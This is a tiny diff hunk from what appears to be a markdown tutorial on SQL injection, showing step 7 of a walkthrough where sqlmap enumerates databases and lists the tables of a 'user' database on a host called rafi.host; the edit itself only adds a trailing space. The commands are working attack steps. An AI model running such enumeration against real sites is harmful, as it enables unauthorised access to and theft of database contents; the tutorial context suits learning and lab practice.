@@ -49,7 +49,7 @@ sqlmap -r fakebook http://rafi.host/index.php --dbs
 ####Step-7 
 Now you can collect the tables list which is stored in databases by using this command.
 
-command:-
+command:- 
 ***
  sqlmap -r fakebook http://rafi.host/index.php -D user --tables 
  ***
